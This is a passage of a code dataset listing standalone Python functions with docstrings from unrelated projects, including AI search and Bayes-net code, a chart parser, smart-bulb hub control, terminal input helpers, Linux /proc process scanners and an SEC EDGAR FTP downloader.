            "def boggle_neighbors(n2, cache={}):\n    \"\"\"Return a list of lists, where the i-th element is the list of indexes\n    for the neighbors of square i.\"\"\"\n    if cache.get(n2):\n        return cache.get(n2)\n    n = exact_sqrt(n2)\n    neighbors = [None] * n2\n    for i in range(n2):\n        neighbors[i] = []\n        on_top = i < n\n        on_bottom = i >= n2 - n\n        on_left = i % n == 0\n        on_right = (i+1) % n == 0\n        if not on_top:\n            neighbors[i].append(i - n)\n            if not on_left:  neighbors[i].append(i - n - 1)\n            if not on_right: neighbors[i].append(i - n + 1)\n        if not on_bottom:\n            neighbors[i].append(i + n)\n            if not on_left:  neighbors[i].append(i + n - 1)\n            if not on_right: neighbors[i].append(i + n + 1)\n        if not on_left: neighbors[i].append(i - 1)\n        if not on_right: neighbors[i].append(i + 1)\n    cache[n2] = neighbors\n    return neighbors"
        ],
        [
            "def exact_sqrt(n2):\n    \"If n2 is a perfect square, return its square root, else raise error.\"\n    n = int(math.sqrt(n2))\n    assert n * n == n2\n    return n"
        ],
        [
            "def expand(self, problem):\n        \"List the nodes reachable in one step from this node.\"\n        return [self.child_node(problem, action)\n                for action in problem.actions(self.state)]"
        ],
        [
            "def child_node(self, problem, action):\n        \"Fig. 3.10\"\n        next = problem.result(self.state, action)\n        return Node(next, self, action,\n                    problem.path_cost(self.path_cost, self.state, action, next))"
        ],
        [
            "def path(self):\n        \"Return a list of nodes forming the path from the root to this node.\"\n        node, path_back = self, []\n        while node:\n            path_back.append(node)\n            node = node.parent\n        return list(reversed(path_back))"
        ],
        [
            "def mate(self, other):\n        \"Return a new individual crossing self and other.\"\n        c = random.randrange(len(self.genes))\n        return self.__class__(self.genes[:c] + other.genes[c:])"
        ],
        [
            "def make_undirected(self):\n        \"Make a digraph into an undirected graph by adding symmetric edges.\"\n        for a in self.dict.keys():\n            for (b, distance) in self.dict[a].items():\n                self.connect1(b, a, distance)"
        ],
        [
            "def connect(self, A, B, distance=1):\n        \"\"\"Add a link from A and B of given distance, and also add the inverse\n        link if the graph is undirected.\"\"\"\n        self.connect1(A, B, distance)\n        if not self.directed: self.connect1(B, A, distance)"
        ],
        [
            "def connect1(self, A, B, distance):\n        \"Add a link from A to B of given distance, in one direction only.\"\n        self.dict.setdefault(A,{})[B] = distance"
        ],
        [
            "def h(self, node):\n        \"h function is straight-line distance from a node's state to goal.\"\n        locs = getattr(self.graph, 'locations', None)\n        if locs:\n            return int(distance(locs[node.state], locs[self.goal]))\n        else:\n            return infinity"
        ],
        [
            "def actions(self, state):\n        \"In the leftmost empty column, try all non-conflicting rows.\"\n        if state[-1] is not None:\n            return []  # All columns filled; no successors\n        else:\n            col = state.index(None)\n            return [row for row in range(self.N)\n                    if not self.conflicted(state, row, col)]"
        ],
        [
            "def result(self, state, row):\n        \"Place the next queen at the given row.\"\n        col = state.index(None)\n        new = state[:]\n        new[col] = row\n        return new"
        ],
        [
            "def set_board(self, board=None):\n        \"Set the board, and find all the words in it.\"\n        if board is None:\n            board = random_boggle()\n        self.board = board\n        self.neighbors = boggle_neighbors(len(board))\n        self.found = {}\n        for i in range(len(board)):\n            lo, hi = self.wordlist.bounds[board[i]]\n            self.find(lo, hi, i, [], '')\n        return self"
        ],
        [
            "def score(self):\n        \"The total score for the words found, according to the rules.\"\n        return sum([self.scores[len(w)] for w in self.words()])"
        ],
        [
            "def TraceAgent(agent):\n    \"\"\"Wrap the agent's program to print its input and output. This will let\n    you see what the agent is doing in the environment.\"\"\"\n    old_program = agent.program\n    def new_program(percept):\n        action = old_program(percept)\n        print '%s perceives %s and does %s' % (agent, percept, action)\n        return action\n    agent.program = new_program\n    return agent"
        ],
        [
            "def ModelBasedVacuumAgent():\n    \"An agent that keeps track of what locations are clean or dirty.\"\n    model = {loc_A: None, loc_B: None}\n    def program((location, status)):\n        \"Same as ReflexVacuumAgent, except if everything is clean, do NoOp.\"\n        model[location] = status ## Update the model here\n        if model[loc_A] == model[loc_B] == 'Clean': return 'NoOp'\n        elif status == 'Dirty': return 'Suck'\n        elif location == loc_A: return 'Right'\n        elif location == loc_B: return 'Left'\n    return Agent(program)"
        ],
        [
            "def step(self):\n        \"\"\"Run the environment for one time step. If the\n        actions and exogenous changes are independent, this method will\n        do.  If there are interactions between them, you'll need to\n        override this method.\"\"\"\n        if not self.is_done():\n            actions = [agent.program(self.percept(agent))\n                       for agent in self.agents]\n            for (agent, action) in zip(self.agents, actions):\n                self.execute_action(agent, action)\n            self.exogenous_change()"
        ],
        [
            "def run(self, steps=1000):\n        \"Run the Environment for given number of time steps.\"\n        for step in range(steps):\n            if self.is_done(): return\n            self.step()"
        ],
        [
            "def list_things_at(self, location, tclass=Thing):\n        \"Return all things exactly at a given location.\"\n        return [thing for thing in self.things\n                if thing.location == location and isinstance(thing, tclass)]"
        ],
        [
            "def add_thing(self, thing, location=None):\n        \"\"\"Add a thing to the environment, setting its location. For\n        convenience, if thing is an agent program we make a new agent\n        for it. (Shouldn't need to override this.\"\"\"\n        if not isinstance(thing, Thing):\n            thing = Agent(thing)\n        assert thing not in self.things, \"Don't add the same thing twice\"\n        thing.location = location or self.default_location(thing)\n        self.things.append(thing)\n        if isinstance(thing, Agent):\n            thing.performance = 0\n            self.agents.append(thing)"
        ],
        [
            "def delete_thing(self, thing):\n        \"\"\"Remove a thing from the environment.\"\"\"\n        try:\n            self.things.remove(thing)\n        except ValueError, e:\n            print e\n            print \"  in Environment delete_thing\"\n            print \"  Thing to be removed: %s at %s\" % (thing, thing.location)\n            print \"  from list: %s\" % [(thing, thing.location)\n                                       for thing in self.things]\n        if thing in self.agents:\n            self.agents.remove(thing)"
        ],
        [
            "def things_near(self, location, radius=None):\n        \"Return all things within radius of location.\"\n        if radius is None: radius = self.perceptible_distance\n        radius2 = radius * radius\n        return [thing for thing in self.things\n                if distance2(location, thing.location) <= radius2]"
        ],
        [
            "def percept(self, agent):\n        \"By default, agent perceives things within a default radius.\"\n        return [self.thing_percept(thing, agent)\n                for thing in self.things_near(agent.location)]"
        ],
        [
            "def move_to(self, thing, destination):\n        \"Move a thing to a new location.\"\n        thing.bump = self.some_things_at(destination, Obstacle)\n        if not thing.bump:\n            thing.location = destination\n            for o in self.observers:\n                o.thing_moved(thing)"
        ],
        [
            "def add_walls(self):\n        \"Put walls around the entire perimeter of the grid.\"\n        for x in range(self.width):\n            self.add_thing(Wall(), (x, 0))\n            self.add_thing(Wall(), (x, self.height-1))\n        for y in range(self.height):\n            self.add_thing(Wall(), (0, y))\n            self.add_thing(Wall(), (self.width-1, y))"
        ],
        [
            "def parse(self, words, S='S'):\n        \"\"\"Parse a list of words; according to the grammar.\n        Leave results in the chart.\"\"\"\n        self.chart = [[] for i in range(len(words)+1)]\n        self.add_edge([0, 0, 'S_', [], [S]])\n        for i in range(len(words)):\n            self.scanner(i, words[i])\n        return self.chart"
        ],
        [
            "def add_edge(self, edge):\n        \"Add edge to chart, and see if it extends or predicts another edge.\"\n        start, end, lhs, found, expects = edge\n        if edge not in self.chart[end]:\n            self.chart[end].append(edge)\n            if self.trace:\n                print '%10s: added %s' % (caller(2), edge)\n            if not expects:\n                self.extender(edge)\n            else:\n                self.predictor(edge)"
        ],
        [
            "def scanner(self, j, word):\n        \"For each edge expecting a word of this category here, extend the edge.\"\n        for (i, j, A, alpha, Bb) in self.chart[j]:\n            if Bb and self.grammar.isa(word, Bb[0]):\n                self.add_edge([i, j+1, A, alpha + [(Bb[0], word)], Bb[1:]])"
        ],
        [
            "def predictor(self, (i, j, A, alpha, Bb)):\n        \"Add to chart any rules for B that could help extend this edge.\"\n        B = Bb[0]\n        if B in self.grammar.rules:\n            for rhs in self.grammar.rewrites_for(B):\n                self.add_edge([j, j, B, [], rhs])"
        ],
        [
            "def extender(self, edge):\n        \"See what edges can be extended by this edge.\"\n        (j, k, B, _, _) = edge\n        for (i, j, A, alpha, B1b) in self.chart[j]:\n            if B1b and B == B1b[0]:\n                self.add_edge([i, k, A, alpha + [edge], B1b[1:]])"
        ],
        [
            "def settings(request):\n    \"\"\"\n    Adds a ``SettingDict`` object for the ``Setting`` model to the context as\n    ``SETTINGS``. Automatically creates non-existent settings with an empty\n    string as the default value.\n    \"\"\"\n    settings = Setting.objects.all().as_dict(default='')\n    context = {\n        'SETTINGS': settings,\n    }\n    return context"
        ],
        [
            "def make_factor(var, e, bn):\n    \"\"\"Return the factor for var in bn's joint distribution given e.\n    That is, bn's full joint distribution, projected to accord with e,\n    is the pointwise product of these factors for bn's variables.\"\"\"\n    node = bn.variable_node(var)\n    vars = [X for X in [var] + node.parents if X not in e]\n    cpt = dict((event_values(e1, vars), node.p(e1[var], e1))\n               for e1 in all_events(vars, bn, e))\n    return Factor(vars, cpt)"
        ],
        [
            "def sum_out(var, factors, bn):\n    \"Eliminate var from all factors by summing over its values.\"\n    result, var_factors = [], []\n    for f in factors:\n        (var_factors if var in f.vars else result).append(f)\n    result.append(pointwise_product(var_factors, bn).sum_out(var, bn))\n    return result"
        ],
        [
            "def all_events(vars, bn, e):\n    \"Yield every way of extending e with values for all vars.\"\n    if not vars:\n        yield e\n    else:\n        X, rest = vars[0], vars[1:]\n        for e1 in all_events(rest, bn, e):\n            for x in bn.variable_values(X):\n                yield extend(e1, X, x)"
        ],
        [
            "def consistent_with(event, evidence):\n    \"Is event consistent with the given evidence?\"\n    return every(lambda (k, v): evidence.get(k, v) == v,\n                 event.items())"
        ],
        [
            "def weighted_sample(bn, e):\n    \"\"\"Sample an event from bn that's consistent with the evidence e;\n    return the event and its weight, the likelihood that the event\n    accords to the evidence.\"\"\"\n    w = 1\n    event = dict(e) # boldface x in Fig. 14.15\n    for node in bn.nodes:\n        Xi = node.variable\n        if Xi in e:\n            w *= node.p(e[Xi], event)\n        else:\n            event[Xi] = node.sample(event)\n    return event, w"
        ],
        [
            "def show_approx(self, numfmt='%.3g'):\n        \"\"\"Show the probabilities rounded and sorted by key, for the\n        sake of portable doctests.\"\"\"\n        return ', '.join([('%s: ' + numfmt) % (v, p)\n                          for (v, p) in sorted(self.prob.items())])"
        ],
        [
            "def add(self, node_spec):\n        \"\"\"Add a node to the net. Its parents must already be in the\n        net, and its variable must not.\"\"\"\n        node = BayesNode(*node_spec)\n        assert node.variable not in self.vars\n        assert every(lambda parent: parent in self.vars, node.parents)\n        self.nodes.append(node)\n        self.vars.append(node.variable)\n        for parent in node.parents:\n            self.variable_node(parent).children.append(node)"
        ],
        [
            "def pointwise_product(self, other, bn):\n        \"Multiply two factors, combining their variables.\"\n        vars = list(set(self.vars) | set(other.vars))\n        cpt = dict((event_values(e, vars), self.p(e) * other.p(e))\n                   for e in all_events(vars, bn, {}))\n        return Factor(vars, cpt)"
        ],
        [
            "def sum_out(self, var, bn):\n        \"Make a factor eliminating var by summing over its values.\"\n        vars = [X for X in self.vars if X != var]\n        cpt = dict((event_values(e, vars),\n                    sum(self.p(extend(e, var, val))\n                        for val in bn.variable_values(var)))\n                   for e in all_events(vars, bn, {}))\n        return Factor(vars, cpt)"
        ],
        [
            "def normalize(self):\n        \"Return my probabilities; must be down to one variable.\"\n        assert len(self.vars) == 1\n        return ProbDist(self.vars[0],\n                        dict((k, v) for ((k,), v) in self.cpt.items()))"
        ],
        [
            "def strip_minidom_whitespace(node):\n    \"\"\"Strips all whitespace from a minidom XML node and its children\n\n    This operation is made in-place.\"\"\"\n    for child in node.childNodes:\n        if child.nodeType == Node.TEXT_NODE:\n            if child.nodeValue:\n                child.nodeValue = child.nodeValue.strip()\n        elif child.nodeType == Node.ELEMENT_NODE:\n            strip_minidom_whitespace(child)"
        ],
        [
            "def color_from_hls(hue, light, sat):\n    \"\"\" Takes a hls color and converts to proper hue \n        Bulbs use a BGR order instead of RGB \"\"\"\n    if light > 0.95: #too bright, let's just switch to white\n        return 256\n    elif light < 0.05: #too dark, let's shut it off\n        return -1\n    else:\n        hue = (-hue + 1 + 2.0/3.0) % 1 # invert and translate by 2/3\n        return int(floor(hue * 256))"
        ],
        [
            "def color_from_rgb(red, green, blue):\n    \"\"\" Takes your standard rgb color \n        and converts it to a proper hue value \"\"\"\n    \n    r = min(red, 255)\n    g = min(green, 255)\n    b = min(blue, 255)\n    if r > 1 or g > 1 or b > 1:\n        r = r / 255.0\n        g = g / 255.0\n        b = b / 255.0\n\n    return color_from_hls(*rgb_to_hls(r,g,b))"
        ],
        [
            "def color_from_hex(value):\n    \"\"\" Takes an HTML hex code\n        and converts it to a proper hue value \"\"\"\n    if \"#\" in value:\n        value = value[1:]\n    \n    try:\n        unhexed = bytes.fromhex(value)\n    except:\n        unhexed = binascii.unhexlify(value) # Fallback for 2.7 compatibility\n    return color_from_rgb(*struct.unpack('BBB',unhexed))"
        ],
        [
            "def wait(self, sec=0.1):\n        \"\"\" Wait for x seconds\n            each wait command is 100ms \"\"\"\n        sec = max(sec, 0)\n        reps = int(floor(sec / 0.1))\n        commands = []\n        for i in range(0, reps):\n            commands.append(Command(0x00, wait=True))\n        return tuple(commands)"
        ],
        [
            "def getJsonFromApi(view, request):\n\t\"\"\"Return json from querying Web Api\n\n\t\tArgs:\n\t\t\tview: django view function.\n\t\t\trequest: http request object got from django.\n\t\t\t\t\n\t\tReturns: json format dictionary\n\t\t\"\"\"\n\tjsonText = view(request)\n\tjsonText = json.loads(jsonText.content.decode('utf-8'))\n\treturn jsonText"
        ],
        [
            "def put(xy, *args):\n    \"\"\"\n    put text on on screen\n    a tuple as first argument tells absolute position for the text\n    does not change TermCursor position\n    args = list of optional position, formatting tokens and strings\n    \"\"\"\n    cmd = [TermCursor.save, TermCursor.move(*xy), ''.join(args), TermCursor.restore]\n    write(''.join(cmd))"
        ],
        [
            "def getpassword(prompt=\"Password: \"):\n    \"\"\"\n    get user input without echo\n    \"\"\"\n\n    fd = sys.stdin.fileno()\n    old = termios.tcgetattr(fd)\n    new = termios.tcgetattr(fd)\n    new[3] &= ~termios.ECHO          # lflags\n    try:\n        termios.tcsetattr(fd, termios.TCSADRAIN, new)\n        passwd = raw_input(prompt)\n    finally:\n        termios.tcsetattr(fd, termios.TCSADRAIN, old)\n    return passwd"
        ],
        [
            "def getch():\n    \"\"\"\n    get character. waiting for key\n    \"\"\"\n    try:\n        termios.tcsetattr(_fd, termios.TCSANOW, _new_settings)\n        ch = sys.stdin.read(1)\n    finally:\n        termios.tcsetattr(_fd, termios.TCSADRAIN, _old_settings)\n    return ch"
        ],
        [
            "def format(self, record):\n        \"\"\"tweaked from source of base\"\"\"\n        try:\n            record.message = record.getMessage()\n        except TypeError:\n            # if error during msg = msg % self.args\n            if record.args:\n                if isinstance(record.args, collections.Mapping):\n                    record.message = record.msg.format(**record.args)\n                else:\n                    record.message = record.msg.format(record.args)\n        self._fmt = self.getfmt(record.levelname)\n        if self.usesTime():\n            record.asctime = self.formatTime(record, self.datefmt)\n\n        s = self._fmt.format(**record.__dict__)\n\n        if record.exc_info:\n            # Cache the traceback text to avoid converting it multiple times\n            # (it's constant anyway)\n            if not record.exc_text:\n                record.exc_text = self.formatException(record.exc_info)\n        if record.exc_text:\n            if s[-1:] != '\\n':\n                s += '\\n'\n            try:\n                s = s + record.exc_text\n            except UnicodeError:\n                s = s + record.exc_text.decode(sys.getfilesystemencoding(), 'replace')\n        return s"
        ],
        [
            "def getProcessOwner(pid):\n    '''\n        getProcessOwner - Get the process owner of a pid\n\n        @param pid <int> - process id\n\n        @return - None if process not found or can't be determined. Otherwise, a dict: \n            {\n                uid  - Owner UID\n                name - Owner name, or None if one cannot be determined\n            }\n    '''\n    try:\n        ownerUid = os.stat('/proc/' + str(pid)).st_uid\n    except:\n        return None\n    \n    try:\n        ownerName = pwd.getpwuid(ownerUid).pw_name\n    except:\n        ownerName = None\n\n    return {\n        'uid' : ownerUid,\n        'name' : ownerName\n    }"
        ],
        [
            "def scanProcessForCwd(pid, searchPortion, isExactMatch=False):\n    '''\n        scanProcessForCwd - Searches a given pid's cwd for a given pattern\n\n            @param pid <int> - A running process ID on this system\n            @param searchPortion <str> - Any portion of directory to search\n            @param isExactMatch <bool> Default False - If match should be exact, otherwise a partial match is performed.\n\n            @return <dict> - If result is found, the following dict is returned. If no match found on the given pid, or pid is not found running, None is returned.\n                {\n                    'searchPortion' : The passed search pattern\n                    'pid'           : The passed pid (as an integer)\n                    'owner'         : String of process owner, or uid if no mapping can be found, or \"unknown\" if neither could be determined.\n                    'cmdline'       : Commandline string\n                    'cwd'           : The exact cwd of matched process\n                }\n    '''\n    try:   \n        try:\n            pid = int(pid)\n        except ValueError as e:\n            sys.stderr.write('Expected an integer, got %s for pid.\\n' %(str(type(pid)),))\n            raise e\n            \n\n        cwd = getProcessCwd(pid)\n        if not cwd:\n            return None\n\n        isMatch = False\n        if isExactMatch is True:\n            if searchPortion == cwd:\n                isMatch = True\n            else:\n                if searchPortion.endswith('/') and searchPortion[:-1] == cwd:\n                    isMatch = True\n        else:\n            if searchPortion in cwd:\n                isMatch = True\n            else:\n                if searchPortion.endswith('/') and searchPortion[:-1] in cwd:\n                    isMatch = True\n\n        if not isMatch:\n            return None\n\n        cmdline = getProcessCommandLineStr(pid)\n        owner   = getProcessOwnerStr(pid)\n\n        return {\n            'searchPortion' : searchPortion,\n            'pid'           : pid,\n            'owner'         : owner,\n            'cmdline'       : cmdline,\n            'cwd'           : cwd,\n        }\n    except OSError:\n        return None\n    except IOError:\n        return None\n    except FileNotFoundError:\n        return None\n    except PermissionError:\n        return None"
        ],
        [
            "def scanAllProcessesForCwd(searchPortion, isExactMatch=False):\n    '''\n        scanAllProcessesForCwd - Scans all processes on the system for a given search pattern.\n\n            @param searchPortion <str> - Any portion of directory to search\n            @param isExactMatch <bool> Default False - If match should be exact, otherwise a partial match is performed.\n\n        @return - <dict> - A dictionary of pid -> cwdResults for each pid that matched the search pattern. For format of \"cwdResults\", @see scanProcessForCwd\n    '''\n    \n    pids = getAllRunningPids()\n\n    cwdResults = [scanProcessForCwd(pid, searchPortion, isExactMatch) for pid in pids]\n    ret = {}\n    for i in range(len(pids)):\n        if cwdResults[i] is not None:\n            ret[pids[i]] = cwdResults[i]\n\n    return ret"
        ],
        [
            "def scanProcessForMapping(pid, searchPortion, isExactMatch=False, ignoreCase=False):\n    '''\n        scanProcessForMapping - Searches a given pid's mappings for a certain pattern.\n\n            @param pid <int> - A running process ID on this system\n            @param searchPortion <str> - A mapping for which to search, example: libc or python or libz.so.1. Give empty string to return all mappings.\n            @param isExactMatch <bool> Default False - If match should be exact, otherwise a partial match is performed.\n            @param ignoreCase <bool> Default False - If True, search will be performed case-insensitively\n\n            @return <dict> - If result is found, the following dict is returned. If no match found on the given pid, or pid is not found running, None is returned.\n                {\n                    'searchPortion' : The passed search pattern\n                    'pid'           : The passed pid (as an integer)\n                    'owner'         : String of process owner, or uid if no mapping can be found, or \"unknown\" if neither could be determined.\n                    'cmdline'       : Commandline string\n                    'matchedMappings' : All mappings likes that matched the given search pattern\n                }\n\n    '''\n    try:   \n        try:\n            pid = int(pid)\n        except ValueError as e:\n            sys.stderr.write('Expected an integer, got %s for pid.\\n' %(str(type(pid)),))\n            raise e\n            \n        with open('/proc/%d/maps' %(pid,), 'r') as f:\n            contents = f.read()\n\n        lines = contents.split('\\n')\n        matchedMappings = []\n    \n        if isExactMatch is True:\n\n            if ignoreCase is False:\n                isMatch = lambda searchFor, searchIn : bool(searchFor == searchIn)\n            else:\n                isMatch = lambda searchFor, searchIn : bool(searchFor.lower() == searchIn.lower())\n        else:\n            if ignoreCase is False:\n                isMatch = lambda searchFor, searchIn : bool(searchFor in searchIn)\n            else:\n                isMatch = lambda searchFor, searchIn : bool(searchFor.lower() in searchIn.lower())\n                \n\n        for line in lines:\n            portion = ' '.join(line.split(' ')[5:]).lstrip()\n            if isMatch(searchPortion, portion):\n                matchedMappings.append('\\t' + line)\n\n        if len(matchedMappings) == 0:\n            return None\n\n\n        cmdline = getProcessCommandLineStr(pid)\n        owner   = getProcessOwnerStr(pid)\n\n        return {\n            'searchPortion' : searchPortion,\n            'pid'           : pid,\n            'owner'         : owner,\n            'cmdline'       : cmdline,\n            'matchedMappings' : matchedMappings,\n        }\n    except OSError:\n        return None\n    except IOError:\n        return None\n    except FileNotFoundError:\n        return None\n    except PermissionError:\n        return None"
        ],
        [
            "def scanAllProcessesForMapping(searchPortion, isExactMatch=False, ignoreCase=False):\n    '''\n        scanAllProcessesForMapping - Scans all processes on the system for a given search pattern.\n\n            @param searchPortion <str> - A mapping for which to search, example: libc or python or libz.so.1. Give empty string to return all mappings.\n            @param isExactMatch <bool> Default False - If match should be exact, otherwise a partial match is performed.\n            @param ignoreCase <bool> Default False - If True, search will be performed case-insensitively\n\n        @return - <dict> - A dictionary of pid -> mappingResults for each pid that matched the search pattern. For format of \"mappingResults\", @see scanProcessForMapping\n    '''\n    pids = getAllRunningPids()\n\n    # Since processes could disappear, we run the scan as fast as possible here with a list comprehension, then assemble the return dictionary later.\n    mappingResults = [scanProcessForMapping(pid, searchPortion, isExactMatch, ignoreCase) for pid in pids]\n    ret = {}\n    for i in range(len(pids)):\n        if mappingResults[i] is not None:\n            ret[pids[i]] = mappingResults[i]\n\n    return ret"
        ],
        [
            "def scanProcessForOpenFile(pid, searchPortion, isExactMatch=True, ignoreCase=False):\n    '''\n        scanProcessForOpenFile - Scans open FDs for a given pid to see if any are the provided searchPortion\n\n            @param searchPortion <str> - Filename to check\n            @param isExactMatch <bool> Default True - If match should be exact, otherwise a partial match is performed.\n            @param ignoreCase <bool> Default False - If True, search will be performed case-insensitively\n\n        @return -  If result is found, the following dict is returned. If no match found on the given pid, or the pid is not found running, None is returned.\n                {\n                    'searchPortion' : The search portion provided\n                    'pid'           : The passed pid (as an integer)\n                    'owner'         : String of process owner, or \"unknown\" if one could not be determined\n                    'cmdline'       : Commandline string\n                    'fds'           : List of file descriptors assigned to this file (could be mapped several times)\n                    'filenames'     : List of the filenames matched\n                }\n    '''\n    try:\n        try:\n            pid = int(pid)\n        except ValueError as e:\n            sys.stderr.write('Expected an integer, got %s for pid.\\n' %(str(type(pid)),))\n            raise e\n\n        prefixDir = \"/proc/%d/fd\" % (pid,)\n\n        processFDs = os.listdir(prefixDir)\n\n        matchedFDs = []\n        matchedFilenames = []\n\n        if isExactMatch is True:\n\n            if ignoreCase is False:\n                isMatch = lambda searchFor, totalPath : bool(searchFor == totalPath)\n            else:\n                isMatch = lambda searchFor, totalPath : bool(searchFor.lower() == totalPath.lower())\n        else:\n            if ignoreCase is False:\n                isMatch = lambda searchFor, totalPath : bool(searchFor in totalPath)\n            else:\n                isMatch = lambda searchFor, totalPath : bool(searchFor.lower() in totalPath.lower())\n            \n\n        for fd in processFDs:\n            fdPath = os.readlink(prefixDir + '/' + fd)\n\n            if isMatch(searchPortion, fdPath):\n                matchedFDs.append(fd)\n                matchedFilenames.append(fdPath)\n\n\n        if len(matchedFDs) == 0:\n            return None\n\n        cmdline = getProcessCommandLineStr(pid)\n        owner   = getProcessOwnerStr(pid)\n            \n        return {\n            'searchPortion' : searchPortion,\n            'pid'           : pid,\n            'owner'         : owner,\n            'cmdline'       : cmdline,\n            'fds'           : matchedFDs,\n            'filenames'     : matchedFilenames, \n        }\n\n\n\n    except OSError:\n        return None\n    except IOError:\n        return None\n    except FileNotFoundError:\n        return None\n    except PermissionError:\n        return None"
        ],
        [
            "def scanAllProcessesForOpenFile(searchPortion, isExactMatch=True, ignoreCase=False):\n    '''\n        scanAllProcessessForOpenFile - Scans all processes on the system for a given filename\n\n            @param searchPortion <str> - Filename to check\n            @param isExactMatch <bool> Default True - If match should be exact, otherwise a partial match is performed.\n            @param ignoreCase <bool> Default False - If True, search will be performed case-insensitively\n\n        @return - <dict> - A dictionary of pid -> mappingResults for each pid that matched the search pattern. For format of \"mappingResults\", @see scanProcessForOpenFile\n    '''\n    pids = getAllRunningPids()\n\n    # Since processes could disappear, we run the scan as fast as possible here with a list comprehension, then assemble the return dictionary later.\n    mappingResults = [scanProcessForOpenFile(pid, searchPortion, isExactMatch, ignoreCase) for pid in pids]\n    ret = {}\n    for i in range(len(pids)):\n        if mappingResults[i] is not None:\n            ret[pids[i]] = mappingResults[i]\n\n    return ret"
        ],
        [
            "def connect(self):\n        \"\"\"Create and connect to socket for TCP communication with hub.\"\"\"\n        try:\n            self._socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n            self._socket.settimeout(TIMEOUT_SECONDS)\n            self._socket.connect((self._ip, self._port))\n            _LOGGER.debug(\"Successfully created Hub at %s:%s :)\", self._ip,\n                          self._port)\n        except socket.error as error:\n            _LOGGER.error(\"Error creating Hub: %s :(\", error)\n            self._socket.close()"
        ],
        [
            "def send_command(self, command):\n        \"\"\"Send TCP command to hub and return response.\"\"\"\n        # use lock to make TCP send/receive thread safe\n        with self._lock:\n            try:\n                self._socket.send(command.encode(\"utf8\"))\n                result = self.receive()\n                # hub may send \"status\"/\"new\" messages that should be ignored\n                while result.startswith(\"S\") or result.startswith(\"NEW\"):\n                    _LOGGER.debug(\"!Got response: %s\", result)\n                    result = self.receive()\n                _LOGGER.debug(\"Received: %s\", result)\n                return result\n            except socket.error as error:\n                _LOGGER.error(\"Error sending command: %s\", error)\n                # try re-connecting socket\n                self.connect()\n                return \"\""
        ],
        [
            "def receive(self):\n        \"\"\"Receive TCP response, looping to get whole thing or timeout.\"\"\"\n        try:\n            buffer = self._socket.recv(BUFFER_SIZE)\n        except socket.timeout as error:\n            # Something is wrong, assume it's offline temporarily\n            _LOGGER.error(\"Error receiving: %s\", error)\n            # self._socket.close()\n            return \"\"\n\n        # Read until a newline or timeout\n        buffering = True\n        response = ''\n        while buffering:\n            if '\\n' in buffer.decode(\"utf8\"):\n                response = buffer.decode(\"utf8\").split('\\n')[0]\n                buffering = False\n            else:\n                try:\n                    more = self._socket.recv(BUFFER_SIZE)\n                except socket.timeout:\n                    more = None\n                if not more:\n                    buffering = False\n                    response = buffer.decode(\"utf8\")\n                else:\n                    buffer += more\n        return response"
        ],
        [
            "def get_data(self):\n        \"\"\"Get current light data as dictionary with light zids as keys.\"\"\"\n        response = self.send_command(GET_LIGHTS_COMMAND)\n        _LOGGER.debug(\"get_data response: %s\", repr(response))\n        if not response:\n            _LOGGER.debug(\"Empty response: %s\", response)\n            return {}\n        response = response.strip()\n        # Check string before splitting (avoid IndexError if malformed)\n        if not (response.startswith(\"GLB\") and response.endswith(\";\")):\n            _LOGGER.debug(\"Invalid response: %s\", repr(response))\n            return {}\n\n        # deconstruct response string into light data. Example data:\n        # GLB 143E,1,1,25,255,255,255,0,0;287B,1,1,22,255,255,255,0,0;\\r\\n\n        response = response[4:-3]  # strip start (GLB) and end (;\\r\\n)\n        light_strings = response.split(';')\n        light_data_by_id = {}\n        for light_string in light_strings:\n            values = light_string.split(',')\n            try:\n                light_data_by_id[values[0]] = [int(values[2]), int(values[4]),\n                                               int(values[5]), int(values[6]),\n                                               int(values[7])]\n            except ValueError as error:\n                _LOGGER.error(\"Error %s: %s (%s)\", error, values, response)\n            except IndexError as error:\n                _LOGGER.error(\"Error %s: %s (%s)\", error, values, response)\n        return light_data_by_id"
        ],
        [
            "def get_lights(self):\n        \"\"\"Get current light data, set and return as list of Bulb objects.\"\"\"\n        # Throttle updates. Use cached data if within UPDATE_INTERVAL_SECONDS\n        now = datetime.datetime.now()\n        if (now - self._last_updated) < datetime.timedelta(\n                seconds=UPDATE_INTERVAL_SECONDS):\n            # _LOGGER.debug(\"Using cached light data\")\n            return self._bulbs\n        else:\n            self._last_updated = now\n\n        light_data = self.get_data()\n        _LOGGER.debug(\"got: %s\", light_data)\n        if not light_data:\n            return []\n\n        if self._bulbs:\n            # Bulbs already created, just update values\n            for bulb in self._bulbs:\n                # use the values for the bulb with the correct ID\n                try:\n                    values = light_data[bulb.zid]\n                    bulb._online, bulb._red, bulb._green, bulb._blue, \\\n                        bulb._level = values\n                except KeyError:\n                    pass\n        else:\n            for light_id in light_data:\n                self._bulbs.append(Bulb(self, light_id, *light_data[light_id]))\n        # return a list of Bulb objects\n        return self._bulbs"
        ],
        [
            "def set_brightness(self, brightness):\n        \"\"\"Set brightness of bulb.\"\"\"\n        command = \"C {},,,,{},\\r\\n\".format(self._zid, brightness)\n        response = self._hub.send_command(command)\n        _LOGGER.debug(\"Set brightness %s: %s\", repr(command), response)\n        return response"
        ],
        [
            "def set_all(self, red, green, blue, brightness):\n        \"\"\"Set color and brightness of bulb.\"\"\"\n        command = \"C {},{},{},{},{},\\r\\n\".format(self._zid, red, green, blue,\n                                                 brightness)\n        response = self._hub.send_command(command)\n        _LOGGER.debug(\"Set all %s: %s\", repr(command), response)\n        return response"
        ],
        [
            "def update(self):\n        \"\"\"Update light objects to their current values.\"\"\"\n        bulbs = self._hub.get_lights()\n        if not bulbs:\n            _LOGGER.debug(\"%s is offline, send command failed\", self._zid)\n            self._online = False"
        ],
        [
            "def retrieve_document(file_path, directory='sec_filings'):\n    '''\n        This function takes a file path beginning with edgar and stores the form in a directory.\n        The default directory is sec_filings but can be changed through a keyword argument.\n    '''\n    ftp = FTP('ftp.sec.gov', timeout=None)\n    ftp.login()\n    name = file_path.replace('/', '_')\n    if not os.path.exists(directory):\n        os.makedirs(directory)\n    with tempfile.TemporaryFile() as temp:\n        ftp.retrbinary('RETR %s' % file_path, temp.write)\n        temp.seek(0)\n        with open('{}/{}'.format(directory, name), 'w+') as f:\n            f.write(temp.read().decode(\"utf-8\"))\n        f.closed\n        records = temp\n        retry = False\n    ftp.close()"
        ],
        [
            "def readtxt(filepath):\n    \"\"\" read file as is\"\"\"\n    with open(filepath, 'rt') as f:\n        lines = f.readlines()\n    return ''.join(lines)"
        ],
        [
